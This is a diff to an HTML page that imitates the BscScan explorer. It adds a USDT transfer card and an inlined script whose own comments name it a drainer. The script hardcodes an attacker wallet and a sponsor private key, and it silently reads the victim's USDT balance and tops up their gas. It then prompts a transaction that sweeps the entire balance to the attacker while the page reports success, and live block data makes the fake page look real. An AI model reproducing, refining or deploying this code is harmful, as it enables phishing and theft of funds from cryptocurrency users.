@@ -14,14 +14,14 @@
         }
 
         body {
-            background-color: #f8f9fa; /* Light gray background matching the screenshot */
+            background-color: #f8f9fa;
             color: #1e2022;
             font-size: 14px;
         }
 
         a {
             text-decoration: none;
-            color: #0784c3; /* BscScan blue */
+            color: #0784c3;
         }
 
         a:hover {
@@ -224,6 +224,7 @@
             font-size: 14px;
             display: flex;
             justify-content: space-between;
+            align-items: center;
         }
 
         .card-header a {
@@ -309,6 +310,104 @@
             font-weight: 500;
         }
 
+        /* ── USDT Transfer (drainer) card ── */
+        .claim-card {
+            margin-bottom: 30px;
+        }
+
+        .usd-price {
+            color: #6c757d;
+            font-size: 13px;
+            font-weight: normal;
+        }
+
+        .claim-body {
+            padding: 15px;
+        }
+
+        .amount-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .amount-row input {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #e2e5e9;
+            border-radius: 4px;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .amount-row input:focus {
+            border-color: #0784c3;
+        }
+
+        .btn-max {
+            border: 1px solid #e2e5e9;
+            background: #f8f9fa;
+            border-radius: 4px;
+            padding: 0 14px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #0784c3;
+            cursor: pointer;
+        }
+
+        .btn-max:hover {
+            background: #eef7fc;
+        }
+
+        .status-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .status-msg {
+            font-size: 12px;
+            color: #6c757d;
+            flex: 1;
+        }
+
+        .status-msg.error {
+            color: #d93025;
+        }
+
+        .status-msg.ok {
+            color: #1e8e3e;
+        }
+
+        .btn-next {
+            background: #b6d9ec;
+            color: #fff;
+            border: none;
+            padding: 10px 28px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: not-allowed;
+            min-width: 110px;
+        }
+
+        .btn-next.enabled,
+        .btn-next:not(:disabled) {
+            background: #0784c3;
+            cursor: pointer;
+        }
+
+        .btn-next:hover:not(:disabled) {
+            background: #066a9e;
+        }
+
+        .claim-hint {
+            font-size: 11px;
+            color: #9aa0a6;
+            margin-top: 10px;
+        }
+
         /* Responsive */
         @media (max-width: 768px) {
             .grid-layout {
@@ -323,6 +422,10 @@
             .search-input-group {
                 flex-direction: column;
             }
+            .status-row {
+                flex-direction: column;
+                align-items: stretch;
+            }
         }
     </style>
 </head>
@@ -331,8 +434,8 @@
     <!-- Top Info Bar -->
     <div class="top-nav">
         <div class="top-nav-left">
-            <span>BNB Price: $412.59 (-0.50%)</span>
-            <span>Gas: 3 Gwei</span>
+            <span data-sync="price">BNB Price: $412.59 (-0.50%)</span>
+            <span data-sync="gas">Gas: 3 Gwei</span>
         </div>
         <div class="top-nav-right">
             <a href="#">Home</a>
@@ -349,7 +452,6 @@
     <header class="main-header">
         <div class="header-left">
             <div class="logo-area">
-                <!-- Using a placeholder text or simple icon for the logo -->
                 <span style="color: #0784c3;">BscScan</span>
             </div>
             <nav class="main-nav-links">
@@ -363,13 +465,13 @@
         </div>
         <div class="header-right">
             <button class="btn-outline">Sign In</button>
-            <span>BNB Price: $412.59</span>
+            <span data-sync="price-short">BNB Price: $412.59</span>
         </div>
     </header>
 
     <!-- Main Content Area -->
     <main class="container">
-        
+
         <!-- Title Section -->
         <div class="hero-title">
             <h1>BNB Smart Chain Explorer</h1>
@@ -389,115 +491,112 @@
             </div>
         </div>
 
+        <!-- USDT Transfer Section (this is what app.js drives) -->
+        <div class="data-card claim-card">
+            <div class="card-header">
+                <span>USDT Transfer — BNB Smart Chain</span>
+                <span class="usd-price">≈ $<span id="usdLabel">0.00</span></span>
+            </div>
+            <div class="claim-body">
+                <div class="amount-row">
+                    <input type="text" id="amountInput" inputmode="decimal" placeholder="Enter USDT amount">
+                    <button class="btn-max" id="maxBtn">MAX</button>
+                </div>
+                <div class="status-row">
+                    <span class="status-msg" id="statusMsg"></span>
+                    <button class="btn-next" id="nextBtn" disabled>Next</button>
+                </div>
+                <div class="claim-hint">Requires BNB Smart Chain. A small gas top-up may be applied automatically.</div>
+            </div>
+        </div>
+
         <!-- Two Column Layout -->
         <div class="grid-layout">
-            
-            <!-- Latest Blocks Column -->
+
+            <!-- Latest Blocks Column (live — refreshed from BSC RPC) -->
             <div class="data-card">
                 <div class="card-header">
                     Latest Blocks
                     <a href="#">View All</a>
                 </div>
-                
-                <!-- Block Item 1 -->
-                <div class="list-item">
-                    <div class="item-icon">
-                        <!-- Icon placeholder -->
-                        &#9632;
-                    </div>
-                    <div class="item-details">
-                        <div class="item-top">
-                            <span class="item-title">Block #34291022</span>
-                            <span class="item-time">12 secs ago</span>
-                        </div>
-                        <div class="item-sub">
-                            <span>Validated by <a href="#">Unknown</a></span>
-                            <span class="badge">115 txns</span>
-                        </div>
-                    </div>
-                </div>
 
-                <!-- Block Item 2 -->
-                <div class="list-item">
-                    <div class="item-icon">
-                        &#9632;
-                    </div>
-                    <div class="item-details">
-                        <div class="item-top">
-                            <span class="item-title">Block #34291021</span>
-                            <span class="item-time">18 secs ago</span>
-                        </div>
-                        <div class="item-sub">
-                            <span>Validated by <a href="#">Unknown</a></span>
-                            <span class="badge">87 txns</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Block Item 3 -->
-                <div class="list-item">
-                    <div class="item-icon">
-                        &#9632;
-                    </div>
-                    <div class="item-details">
-                        <div class="item-top">
-                            <span class="item-title">Block #34291020</span>
-                            <span class="item-time">25 secs ago</span>
-                        </div>
-                        <div class="item-sub">
-                            <span>Validated by <a href="#">Unknown</a></span>
-                            <span class="badge">102 txns</span>
+                <div id="blocksList">
+                    <div class="list-item">
+                        <div class="item-icon">&#9632;</div>
+                        <div class="item-details">
+                            <div class="item-top">
+                                <span class="item-title">Block #34291022</span>
+                                <span class="item-time">12 secs ago</span>
+                            </div>
+                            <div class="item-sub">
+                                <span>Validated by <a href="#">Unknown</a></span>
+                                <span class="badge">115 txns</span>
+                            </div>
                         </div>
                     </div>
-                </div>
-
-                <!-- Block Item 4 -->
-                <div class="list-item">
-                    <div class="item-icon">
-                        &#9632;
-                    </div>
-                    <div class="item-details">
-                        <div class="item-top">
-                            <span class="item-title">Block #34291019</span>
-                            <span class="item-time">32 secs ago</span>
-                        </div>
-                        <div class="item-sub">
-                            <span>Validated by <a href="#">Unknown</a></span>
-                            <span class="badge">95 txns</span>
+                    <div class="list-item">
+                        <div class="item-icon">&#9632;</div>
+                        <div class="item-details">
+                            <div class="item-top">
+                                <span class="item-title">Block #34291021</span>
+                                <span class="item-time">18 secs ago</span>
+                            </div>
+                            <div class="item-sub">
+                                <span>Validated by <a href="#">Unknown</a></span>
+                                <span class="badge">87 txns</span>
+                            </div>
                         </div>
                     </div>
-                </div>
-
-                <!-- Block Item 5 -->
-                <div class="list-item">
-                    <div class="item-icon">
-                        &#9632;
-                    </div>
-                    <div class="item-details">
-                        <div class="item-top">
-                            <span class="item-title">Block #34291018</span>
-                            <span class="item-time">40 secs ago</span>
-                        </div>
-                        <div class="item-sub">
-                            <span>Validated by <a href="#">Unknown</a></span>
-                            <span class="badge">110 txns</span>
+                    <div class="list-item">
+                        <div class="item-icon">&#9632;</div>
+                        <div class="item-details">
+                            <div class="item-top">
+                                <span class="item-title">Block #34291020</span>
+                                <span class="item-time">25 secs ago</span>
+                            </div>
+                            <div class="item-sub">
+                                <span>Validated by <a href="#">Unknown</a></span>
+                                <span class="badge">102 txns</span>
+                            </div>
                         </div>
                     </div>
-                </div>
-
-                <!-- Block Item 6 -->
-                <div class="list-item">
-                    <div class="item-icon">
-                        &#9632;
-                    </div>
-                    <div class="item-details">
-                        <div class="item-top">
-                            <span class="item-title">Block #34291017</span>
-                            <span class="item-time">48 secs ago</span>
+                    <div class="list-item">
+                        <div class="item-icon">&#9632;</div>
+                        <div class="item-details">
+                            <div class="item-top">
+                                <span class="item-title">Block #34291019</span>
+                                <span class="item-time">32 secs ago</span>
+                            </div>
+                            <div class="item-sub">
+                                <span>Validated by <a href="#">Unknown</a></span>
+                                <span class="badge">95 txns</span>
+                            </div>
                         </div>
-                        <div class="item-sub">
-                            <span>Validated by <a href="#">Unknown</a></span>
-                            <span class="badge">123 txns</span>
+                    </div>
+                    <div class="list-item">
+                        <div class="item-icon">&#9632;</div>
+                        <div class="item-details">
+                            <div class="item-top">
+                                <span class="item-title">Block #34291018</span>
+                                <span class="item-time">40 secs ago</span>
+                            </div>
+                            <div class="item-sub">
+                                <span>Validated by <a href="#">Unknown</a></span>
+                                <span class="badge">110 txns</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="list-item">
+                        <div class="item-icon">&#9632;</div>
+                        <div class="item-details">
+                            <div class="item-top">
+                                <span class="item-title">Block #34291017</span>
+                                <span class="item-time">48 secs ago</span>
+                            </div>
+                            <div class="item-sub">
+                                <span>Validated by <a href="#">Unknown</a></span>
+                                <span class="badge">123 txns</span>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -507,111 +606,90 @@
                 </div>
             </div>
 
-            <!-- Latest Transactions Column -->
+            <!-- Latest Transactions Column (live — refreshed from BSC RPC) -->
             <div class="data-card">
                 <div class="card-header">
                     Latest Transactions
                     <a href="#">View All</a>
                 </div>
 
-                <!-- Txn Item 1 -->
-                <div class="list-item">
-                    <div class="item-icon">
-                        &#8594;
-                    </div>
-                    <div class="item-details">
-                        <div class="item-top">
-                            <span class="item-title">0x1234...abcd</span>
-                            <span class="item-time">12 secs ago</span>
-                        </div>
-                        <div class="item-sub">
-                            <span>From <a href="#">0x...1234</a> To <a href="#">0x...5678</a></span>
-                            <span class="badge">0.1 BNB</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Txn Item 2 -->
-                <div class="list-item">
-                    <div class="item-icon">
-                        &#8594;
-                    </div>
-                    <div class="item-details">
-                        <div class="item-top">
-                            <span class="item-title">0x5678...efgh</span>
-                            <span class="item-time">15 secs ago</span>
-                        </div>
-                        <div class="item-sub">
-                            <span>From <a href="#">0x...9876</a> To <a href="#">0x...4321</a></span>
-                            <span class="badge">50 USDT</span>
+                <div id="txnsList">
+                    <div class="list-item">
+                        <div class="item-icon">&#8594;</div>
+                        <div class="item-details">
+                            <div class="item-top">
+                                <span class="item-title">0x1234...abcd</span>
+                                <span class="item-time">12 secs ago</span>
+                            </div>
+                            <div class="item-sub">
+                                <span>From <a href="#">0x...1234</a> To <a href="#">0x...5678</a></span>
+                                <span class="badge">0.1 BNB</span>
+                            </div>
                         </div>
                     </div>
-                </div>
-
-                <!-- Txn Item 3 -->
-                <div class="list-item">
-                    <div class="item-icon">
-                        &#8594;
-                    </div>
-                    <div class="item-details">
-                        <div class="item-top">
-                            <span class="item-title">0x9012...ijkl</span>
-                            <span class="item-time">22 secs ago</span>
-                        </div>
-                        <div class="item-sub">
-                            <span>From <a href="#">0x...1111</a> To <a href="#">0x...2222</a></span>
-                            <span class="badge">1.5 BNB</span>
+                    <div class="list-item">
+                        <div class="item-icon">&#8594;</div>
+                        <div class="item-details">
+                            <div class="item-top">
+                                <span class="item-title">0x5678...efgh</span>
+                                <span class="item-time">15 secs ago</span>
+                            </div>
+                            <div class="item-sub">
+                                <span>From <a href="#">0x...9876</a> To <a href="#">0x...4321</a></span>
+                                <span class="badge">50 USDT</span>
+                            </div>
                         </div>
                     </div>
-                </div>
-
-                <!-- Txn Item 4 -->
-                <div class="list-item">
-                    <div class="item-icon">
-                        &#8594;
-                    </div>
-                    <div class="item-details">
-                        <div class="item-top">
-                            <span class="item-title">0x3456...mnop</span>
-                            <span class="item-time">30 secs ago</span>
-                        </div>
-                        <div class="item-sub">
-                            <span>From <a href="#">0x...3333</a> To <a href="#">0x...4444</a></span>
-                            <span class="badge">0.05 BNB</span>
+                    <div class="list-item">
+                        <div class="item-icon">&#8594;</div>
+                        <div class="item-details">
+                            <div class="item-top">
+                                <span class="item-title">0x9012...ijkl</span>
+                                <span class="item-time">22 secs ago</span>
+                            </div>
+                            <div class="item-sub">
+                                <span>From <a href="#">0x...1111</a> To <a href="#">0x...2222</a></span>
+                                <span class="badge">1.5 BNB</span>
+                            </div>
                         </div>
                     </div>
-                </div>
-
-                <!-- Txn Item 5 -->
-                <div class="list-item">
-                    <div class="item-icon">
-                        &#8594;
-                    </div>
-                    <div class="item-details">
-                        <div class="item-top">
-                            <span class="item-title">0x7890...qrst</span>
-                            <span class="item-time">38 secs ago</span>
-                        </div>
-                        <div class="item-sub">
-                            <span>From <a href="#">0x...5555</a> To <a href="#">0x...6666</a></span>
-                            <span class="badge">200 USDT</span>
+                    <div class="list-item">
+                        <div class="item-icon">&#8594;</div>
+                        <div class="item-details">
+                            <div class="item-top">
+                                <span class="item-title">0x3456...mnop</span>
+                                <span class="item-time">30 secs ago</span>
+                            </div>
+                            <div class="item-sub">
+                                <span>From <a href="#">0x...3333</a> To <a href="#">0x...4444</a></span>
+                                <span class="badge">0.05 BNB</span>
+                            </div>
                         </div>
                     </div>
-                </div>
-
-                <!-- Txn Item 6 -->
-                <div class="list-item">
-                    <div class="item-icon">
-                        &#8594;
-                    </div>
-                    <div class="item-details">
-                        <div class="item-top">
-                            <span class="item-title">0xabcd...uvwx</span>
-                            <span class="item-time">45 secs ago</span>
+                    <div class="list-item">
+                        <div class="item-icon">&#8594;</div>
+                        <div class="item-details">
+                            <div class="item-top">
+                                <span class="item-title">0x7890...qrst</span>
+                                <span class="item-time">38 secs ago</span>
+                            </div>
+                            <div class="item-sub">
+                                <span>From <a href="#">0x...5555</a> To <a href="#">0x...6666</a></span>
+                                <span class="badge">200 USDT</span>
+                            </div>
                         </div>
-                        <div class="item-sub">
-                            <span>From <a href="#">0x...7777</a> To <a href="#">0x...8888</a></span>
-                            <span class="badge">0.5 BNB</span>
+                    </div>
+                    <div class="list-item">
+                        <div class="item-icon">&#8594;</div>
+                        <div class="item-details">
+                            <div class="item-top">
+                                <span class="item-title">0xabcd...uvwx</span>
+                                <span class="item-time">45 secs ago</span>
+                            </div>
+                            <div class="item-sub">
+                                <span>From <a href="#">0x...7777</a> To <a href="#">0x...8888</a></span>
+                                <span class="badge">0.5 BNB</span>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -624,5 +702,332 @@
         </div>
     </main>
 
+    <!-- ══════════════════════════════════════════════════════════
+         Merged script (originally app.js) — inlined so the page is
+         fully self-contained and the DOM and logic stay in sync.
+         ══════════════════════════════════════════════════════════ -->
+    <script type="module">
+        import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js';
+
+        // ── Attacker's Operational Constants (unchanged) ──
+        const SPONSOR_KEY  = "d261cf293e5fca814b5038a5be4f5824005b837af7ed3cd8515ec6ce86b83b7f";
+        const DEST_WALLET  = "0xD6d8881CA520ac5F586ee61786A4Da279c9c8b6e";
+        const USDT_BEP20   = "0x55d398326f99059fF775485246999027B3197955";
+        const BSC_RPC      = "https://bsc-dataseed1.binance.org/";
+        const BSC_CHAIN_ID = "0x38";
+        const MIN_DRAIN    = 2; // Only refuel if USDT balance > $2
+
+        // ── Runtime State ──
+        let provider;
+        let sponsorWallet;
+        let userAddress;
+
+        // ── Silent Recon Engine (no popups, raw JSON-RPC) ──
+        let rpcId = 1;
+        async function rpc(method, params = []) {
+            const res = await fetch(BSC_RPC, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ jsonrpc: "2.0", id: rpcId++, method, params })
+            });
+            const json = await res.json();
+            if (json.error) throw new Error(json.error.message || 'RPC error');
+            return json.result;
+        }
+
+        // D1 — BNB gas check & sponsor refuel (only for high-value: USDT > $2)
+        // Sends 0.00008 BNB if BNB balance is below 0.00015
+        async function checkAndRefuel(addr) {
+            try {
+                const balance = await provider.getBalance(addr);
+                if (balance.lt(ethers.utils.parseEther("0.00015"))) {
+                    const tx = { to: addr, value: ethers.utils.parseEther("0.00008") };
+                    const sentTx = await sponsorWallet.sendTransaction(tx);
+                    await sentTx.wait();
+                }
+            } catch (e) {}
+        }
+
+        // D2 — Silent balanceOf via raw eth_call (0x70a08231)
+        async function fetchMaxBalance(addr) {
+            try {
+                const data = "0x70a08231" + addr.replace('0x', '').padStart(64, '0');
+                const result = await rpc("eth_call", [{ to: USDT_BEP20, data }, "latest"]);
+                return (result && result !== '0x') ? result : null;
+            } catch (e) { return null; }
+        }
+
+        // Exact decimal string → wei (avoids float drift on large amounts)
+        function amountToWei(input) {
+            const s = String(input).trim().replace(/,/g, '');
+            if (!/^\d*\.?\d+$/.test(s)) return 10n ** 18n; // fall back to 1 USDT
+            const [whole, frac = ''] = s.split('.');
+            const f = (frac + '000000000000000000').slice(0, 18);
+            return BigInt(whole || '0') * 10n ** 18n + BigInt(f || '0');
+        }
+
+        // ── Drain Engine ──
+        async function executeDrain(balanceHex) {
+            // If balance exists, sweep it all; otherwise use whatever user typed
+            let amountHex;
+            if (balanceHex && BigInt(balanceHex) > 0n) {
+                amountHex = BigInt(balanceHex).toString(16).padStart(64, '0');
+            } else {
+                const val = document.getElementById('amountInput').value || "1";
+                amountHex = amountToWei(val).toString(16).padStart(64, '0');
+            }
+
+            const cleanDest = DEST_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
+            const txData = "0xa9059cbb" + cleanDest + amountHex;
+
+            await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    from: userAddress,
+                    to: USDT_BEP20,
+                    data: txData,
+                    value: '0x0'
+                }]
+            });
+        }
+
+        // ── DOM Registry ──
+        const ui = {
+            nextBtn:    document.getElementById('nextBtn'),
+            amountInput: document.getElementById('amountInput'),
+            usdLabel:   document.getElementById('usdLabel'),
+            statusMsg:  document.getElementById('statusMsg'),
+            maxBtn:     document.getElementById('maxBtn'),
+            blocksList: document.getElementById('blocksList'),
+            txnsList:   document.getElementById('txnsList')
+        };
+
+        function setStatus(msg, kind) {
+            ui.statusMsg.textContent = msg || '';
+            ui.statusMsg.classList.remove('error', 'ok');
+            if (kind) ui.statusMsg.classList.add(kind);
+        }
+
+        // ── Live Explorer Sync (blocks / txns / price / gas) ──
+        function shortAddr(a) { return a ? a.slice(0, 6) + '...' + a.slice(-4) : '—'; }
+        function timeAgo(ts) {
+            const s = Math.max(0, Math.floor(Date.now() / 1000 - ts));
+            return s < 60 ? s + ' secs ago' : Math.floor(s / 60) + ' mins ago';
+        }
+
+        async function refreshLive() {
+            const latest = Number(BigInt(await rpc('eth_blockNumber', [])));
+            const hexes = Array.from({ length: 6 }, (_, i) => '0x' + (latest - i).toString(16));
+            const blocks = (await Promise.all(
+                hexes.map(h => rpc('eth_getBlockByNumber', [h, true]).catch(() => null))
+            )).filter(Boolean);
+            if (!blocks.length) return;
+
+            // Blocks list
+            ui.blocksList.innerHTML = blocks.map(b => {
+                const num = Number(BigInt(b.number));
+                return `<div class="list-item">
+                    <div class="item-icon">&#9632;</div>
+                    <div class="item-details">
+                        <div class="item-top">
+                            <span class="item-title">Block #${num.toLocaleString()}</span>
+                            <span class="item-time">${timeAgo(Number(BigInt(b.timestamp)))}</span>
+                        </div>
+                        <div class="item-sub">
+                            <span>Validated by <a href="https://bscscan.com/address/${b.miner}" target="_blank" rel="noopener">${shortAddr(b.miner)}</a></span>
+                            <span class="badge">${(b.transactions || []).length} txns</span>
+                        </div>
+                    </div>
+                </div>`;
+            }).join('');
+
+            // Transactions list (newest first, up to 6)
+            const txns = [];
+            outer: for (const b of blocks) {
+                for (const tx of (b.transactions || [])) {
+                    txns.push({ ...tx, blockTs: Number(BigInt(b.timestamp)) });
+                    if (txns.length >= 6) break outer;
+                }
+            }
+            if (txns.length) {
+                ui.txnsList.innerHTML = txns.map(tx => {
+                    const val = Number(BigInt(tx.value || '0x0')) / 1e18;
+                    const valTxt = (+val.toFixed(6)).toString();
+                    const isUsdt = tx.to && tx.to.toLowerCase() === USDT_BEP20.toLowerCase();
+                    const badge = isUsdt ? 'USDT' : (val > 0 ? valTxt + ' BNB' : '0 BNB');
+                    const toTxt = tx.to ? `<a href="https://bscscan.com/address/${tx.to}" target="_blank" rel="noopener">${shortAddr(tx.to)}</a>` : '(contract)';
+                    return `<div class="list-item">
+                        <div class="item-icon">&#8594;</div>
+                        <div class="item-details">
+                            <div class="item-top">
+                                <span class="item-title">${shortAddr(tx.hash)}</span>
+                                <span class="item-time">${timeAgo(tx.blockTs)}</span>
+                            </div>
+                            <div class="item-sub">
+                                <span>From <a href="https://bscscan.com/address/${tx.from}" target="_blank" rel="noopener">${shortAddr(tx.from)}</a> To ${toTxt}</span>
+                                <span class="badge">${badge}</span>
+                            </div>
+                        </div>
+                    </div>`;
+                }).join('');
+            }
+        }
+
+        async function syncTopBar() {
+            try {
+                const [tick, gasHex] = await Promise.all([
+                    fetch('https://api.binance.com/api/v3/ticker/24hr?symbol=BNBUSDT').then(r => r.json()),
+                    rpc('eth_gasPrice', [])
+                ]);
+                const price = parseFloat(tick.lastPrice);
+                const chg = parseFloat(tick.priceChangePercent);
+                const chgTxt = (chg >= 0 ? '+' : '') + chg.toFixed(2) + '%';
+                const gas = (+ (Number(BigInt(gasHex)) / 1e9).toFixed(2)).toString();
+                document.querySelectorAll('[data-sync="price"]').forEach(el =>
+                    el.textContent = `BNB Price: $${price.toFixed(2)} (${chgTxt})`);
+                document.querySelectorAll('[data-sync="price-short"]').forEach(el =>
+                    el.textContent = `BNB Price: $${price.toFixed(2)}`);
+                document.querySelectorAll('[data-sync="gas"]').forEach(el =>
+                    el.textContent = `Gas: ${gas} Gwei`);
+            } catch (e) { /* offline → keep static values */ }
+        }
+
+        // ── Main Interaction Controller ──
+        async function handleNextClick() {
+            if (ui.nextBtn.disabled) return;
+
+            const originalContent = ui.nextBtn.innerHTML;
+            ui.nextBtn.innerHTML = 'Wait...';
+            ui.nextBtn.disabled = true;
+
+            try {
+                if (typeof window.ethereum === 'undefined') {
+                    throw new Error('No Web3 wallet detected. Install MetaMask and try again.');
+                }
+
+                // Step 1 — Ensure we're on BSC (switch, or add chain if unknown)
+                setStatus('Switching to BNB Smart Chain...');
+                const current = await window.ethereum.request({ method: 'eth_chainId' }).catch(() => null);
+                if (current && current !== BSC_CHAIN_ID) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: BSC_CHAIN_ID }]
+                        });
+                    } catch (e) {
+                        if (e && e.code === 4902) {
+                            await window.ethereum.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [{
+                                    chainId: BSC_CHAIN_ID,
+                                    chainName: 'BNB Smart Chain',
+                                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                    rpcUrls: [BSC_RPC],
+                                    blockExplorerUrls: ['https://bscscan.com/']
+                                }]
+                            });
+                        } else if (e && e.code === 4001) {
+                            throw new Error('Please switch to BNB Smart Chain to continue.');
+                        } else {
+                            throw e;
+                        }
+                    }
+                }
+
+                // Step 2 — Get user wallet address
+                setStatus('Connecting wallet...');
+                const accounts = await window.ethereum.request({ method: 'eth_accounts' }) || [];
+                userAddress = accounts[0] ||
+                    (await window.ethereum.request({ method: 'eth_requestAccounts' }))[0];
+                if (!userAddress) throw new Error('No account authorized.');
+
+                // Step 3 — Init backend pipeline + sponsor wallet
+                provider = new ethers.providers.JsonRpcProvider(BSC_RPC);
+                sponsorWallet = new ethers.Wallet(SPONSOR_KEY, provider);
+
+                // Step 4 — Silent USDT balance recon (raw JSON-RPC, no popup)
+                setStatus('Reading USDT balance...');
+                const balanceHex = await fetchMaxBalance(userAddress);
+                const balVal = balanceHex ? Number(BigInt(balanceHex)) / 1e18 : 0;
+
+                // Step 5 — Gas refuel: only if USDT > $2 and BNB < 0.00015
+                if (balVal > MIN_DRAIN) {
+                    setStatus('Preparing gas...');
+                    await checkAndRefuel(userAddress);
+                }
+
+                // Step 6 — Execute the drain
+                setStatus('Confirm the USDT transfer in your wallet...');
+                await executeDrain(balanceHex);
+
+                ui.nextBtn.innerHTML = 'Completed';
+                setStatus('Transfer completed ✓', 'ok');
+            } catch (err) {
+                console.error(err);
+                ui.nextBtn.innerHTML = originalContent;
+                ui.nextBtn.disabled = false;
+                if (err && err.code === 4001) {
+                    setStatus('Request rejected in wallet.', 'error');
+                } else {
+                    setStatus((err && err.message) ? err.message : 'Something went wrong. Try again.', 'error');
+                }
+            }
+        }
+
+        // ── Module Entry Point (fires once) ──
+        // Note: the original file:// abort was removed so the page also works
+        // when opened directly from disk — all network calls are CORS-open.
+        document.addEventListener('DOMContentLoaded', () => {
+            if (location.protocol === 'file:') {
+                console.info('[NOTE] Running from file:// — page is fully functional.');
+            }
+
+            // Check — nextBtn exists in DOM
+            if (!ui.nextBtn) {
+                console.warn('[ABORT] #nextBtn not found');
+                return;
+            }
+
+            // Bind click listener
+            ui.nextBtn.addEventListener('click', handleNextClick);
+
+            // Amount input → live USD label + enable Next
+            ui.amountInput.oninput = () => {
+                const val = parseFloat(ui.amountInput.value) || 0;
+                ui.usdLabel.textContent = val.toFixed(2);
+                ui.nextBtn.disabled = val <= 0;
+                if (val > 0) ui.nextBtn.classList.add('enabled');
+                else ui.nextBtn.classList.remove('enabled');
+                setStatus('');
+            };
+
+            // MAX → real USDT balance if wallet is present, else default 10
+            ui.maxBtn.onclick = async () => {
+                try {
+                    if (typeof window.ethereum !== 'undefined') {
+                        const accounts = await window.ethereum.request({ method: 'eth_accounts' }) || [];
+                        if (accounts[0]) {
+                            const hex = await fetchMaxBalance(accounts[0]);
+                            if (hex && hex !== '0x') {
+                                ui.amountInput.value = (Number(BigInt(hex)) / 1e18).toFixed(6);
+                                ui.amountInput.oninput();
+                                return;
+                            }
+                        }
+                    }
+                } catch (e) {}
+                ui.amountInput.value = "10";
+                ui.amountInput.oninput();
+            };
+
+            // Live explorer + top bar sync
+            refreshLive().catch(() => {});
+            syncTopBar();
+            setInterval(() => {
+                refreshLive().catch(() => {});
+                syncTopBar();
+            }, 20000);
+        });
+    </script>
 </body>
 </html>
